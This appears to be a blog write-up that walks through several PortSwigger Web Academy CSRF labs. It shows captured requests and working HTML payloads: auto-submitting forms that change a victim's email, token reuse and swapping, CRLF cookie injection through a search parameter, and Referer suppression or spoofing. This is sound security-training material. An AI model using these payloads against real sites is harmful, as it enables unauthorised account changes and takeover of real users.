# Intro
This post/writeup is all about the Cross-Site Request Forgery.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/csrf) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.

# CSRF vulnerability with no defenses
> This lab's email change functionality is vulnerable to CSRF.
> 
> To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
> 
> You can log in to your own account using the following credentials: wiener:peter

This is how the lab's web page looks like. It's a blog but with logon option.
**Keep in mind that in this lab, delivering the payload to victim is done simply by clicking the button. We're dealing with exploiting CSRF only!**

Let's login using provided credentials `wiener:peter`.

We can change the email and send check the request in `Burp`.

```

```

As a login user we have a session token. `SameSite` attribute is not being used!

This is the template that i'll use for this lab. It's a simple form that changes the email to something else.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

We now simply click on `Deliver exploit to victim` and in the background, the email of `wiener`'s should have been changed. We can check access log if the form has been visited by a victim.

It should be clear by now that having no CSRF defenses is not a good idea!

# CSRF where token validation depends on request method
> This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

Page looks indentical as seen above. We can login using `wiener:peter` and change an email. This is captured request (I've deleted few non-relevant headers):

```
POST /my-account/change-email HTTP/1.1
Host: 0ad9005c03111f09c097041f00bf0010.web-security-academy.net
Cookie: session=8gJDTnMZWjsviceaBy16qVHSXfaqLOZf

...
Connection: close

email=asd%40normal-user.net&csrf=ZsSzUXhTgY9TZ3c6GZeavES14EQDiDAr
```

I'll send request to `Responder` and try with same CSRF token and without. I can change the email again using same token.

If i remove the `csrf=` parameter and/or it's value i'd see `"Missing parameter 'csrf'"`.

What if we send GET request instead?

![picture 4](/assets/images/700efbad4bbb057e963700a3b834bcc398ff304b40b5247e1a4d1269221a2d04.png)  

Yep, that'll work and CSRF token won't get checked.

Following Payload can be applied which will cause GET request to be sent from the victim

```html
<form action="https://0ae500a50484da0fc20b17a4007600fe.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

# CSRF where token validation depends on token being present
> This lab's email change functionality is vulnerable to CSRF.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>

Only difference here compatered to previous labs is that when we remove csrf token entirely, we'll be able to change the email. 

CSRF token will not be checked if not present in the request.

In order to solve the lab, we have to login, change the email, capture that request and remove the CSRF parameter from the POST request.

```
POST /my-account/change-email HTTP/1.1
Host: 0a4a002e04958d54c160c28800b500a0.web-security-academy.net

```

This is what we'll deliver to the victim using `Deliver exploit to victim` button on our exploit server.

```html
<form method="POST" action="https://0a4a002e04958d54c160c28800b500a0.web-security-academy.net/my-account/change-email">

```

In this lab we'll login as wiener and carlos (two different browsers or using incognito mode) and we'll try to swap the CSRF tokens and check if they're bound to user or not. If not, we can just send our CSRF token to victim and email change should work.

![picture 5](/assets/images/471be39da47f5f184aa638fcbf8c23644b88b12c845bd4f85cdf924e62cf17bb.png)  

Success. Only thing that we have to pay attention to is that CSRF token can be used only once!

Let's deliver the payload to the victim. 

We have to refresh the page and use the fresh, unused token, or change the email using `wiener` or `carlos` and intercept the request, grab the token and drop the request afterwards.

```html
<form method="POST" action="https://0a9300a403fc868dc0d03bd1009d007c.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
<input type="hidden" name="csrf" value="zQwm5Fz16qcy4aZ80oCSRagNpkNYVnCT">

</form>
<script>
        document.forms[0].submit();
</script>
```

Lab has been solved.

# CSRF where token is tied to non-session cookie
> This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
> 
> - wiener:peter
> - carlos:montoya

This problem where token is tied to a non-session cookie might happen when the web app deploys two different frameworks which don't interact efficently with each other - in regards of CSRF.

If we use `wiener` for testing and take `csrfKey` and `csrf` parameter from `carlos`, we'll bypass CSRF protection succesfully.

![picture 6](/assets/images/5fe591906d82c482bfd5f5b8eed48a08cbfc7eb61291d66c10aafa5651aff242.png)  

Now how we can deliver that?

This lab acts weird when we start search like this

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=wqVM7TKrfyTIhKMenMYcMc96RGP6DX6v%3b%20SameSite=None
```

Server responds with

```
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=wqVM7TKrfyTIhKMenMYcMc96RGP6DX6v; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3215
```

We can send a `csrfKey`, or better said, reflect it to the victim.

I'll use payload that was proposed in solution as well. We have to ditch the script and rather use `img` tag instead, to make reflection work!

```html
<form method="POST" action="https://0a5300d20416d3fcc016e18b001800a7.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
<input type="hidden" name="csrf" value="N1emx758Z7WvJCyVpuDvJIDd1Gtl3D9Q">

</form>
<img src="https://0a5300d20416d3fcc016e18b001800a7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=y8QhVUO6h50Ing529s6rMEqhS1ySAAqn%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

# CSRF where token is duplicated in cookie
> This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

In this lab we have the same values in the cookia an in the request

```

```

If we send request to `search` endpoint which is known to set cookie for the `lastSearch`, but we can add `csrf` cookie as well!

```
/?search=test%0d%0aSet-Cookie:%20csrf=spoof 
```

and response:

```
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=spoof; Secure; HttpOnly
```

CSRF token is set to our spoofed value and it stays the same.

![picture 7](/assets/images/a5d21685409a86f3b2bb6ea1ae31578feb538d9b215de62e7bc792661591e4f4.png)  

We can deliver similar payload as in previous lab

```html
<form method="POST" action="https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
<input type="hidden" name="csrf" value="spoof">

</form>

<img src="https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=spoof%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

# CSRF where Referer validation depends on header being present
> This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

In this lab we're supposed to change the email from the victim. If we log in we and change the email, request will be send like this (I've removed some irelevant headers):

```
POST /my-account/change-email HTTP/1.1
Host: 0acc007a0407b9cdc0166311009f004e.web-security-academy.net
Cookie: session=XQrmFJwOd7sZAGjGr6IlA7Uxx149kezF
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net
Referer: https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
...
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
Connection: close

email=asdd%40normal-user.net
```

Email will be changed, if we however change referrer to our exploit address, we'll see `Invalid referer header`. If we remove referrer header entirely, we'll be able to change the email again.

We can deliver payload as we've done it before, just this time by using `<meta name="referrer" content="no-referrer">` which won't forward the header to the web server in the CSRF request.

```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>

<img src=x onerror="document.forms[0].submit();"/>
```

# CSRF with broken Referer validation
> This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

This lab looks like the previous ones. We login using provided credentials `wiener:peter` and change the email and send this change request to repeater. 

After fiddling with the Referrer header, request will be accepted if it contains the URL. If i use URL from exploit server, request won't be accepted anymore.

Problem arises how to spoof referrer header using reflection in victims browser.

This is one of the ways how the labs can be done.

```html
<meta name="referrer" content="unsafe-url">
<script>
history.pushState("", "", "/?c=https://0ab4007d03078aecc0dab49e00b000a3.web-security-academy.net/my-account")
</script>
<form method="POST" action="https://0ab4007d03078aecc0dab49e00b000a3.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>

<img src=x  onerror="document.forms[0].submit();"/>
```

Mind the Referrer using `unsafe-url` and `history.pushState`!

> All the labs look opticaly the same so i didn't make that many screenshots, so appologies for that!
